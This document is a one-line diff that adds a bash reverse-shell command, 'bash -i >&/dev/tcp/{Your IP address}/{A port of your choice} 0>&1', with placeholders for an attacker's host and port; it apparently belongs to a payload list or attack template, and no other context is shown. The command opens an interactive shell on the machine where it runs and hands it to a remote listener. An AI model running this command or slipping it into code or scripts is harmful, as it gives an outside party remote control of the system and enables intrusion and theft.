@@ -1,0 +1,1 @@
+'bash -c bash -i >&/dev/tcp/{Your IP address}/{A port of your choice} 0>&1'
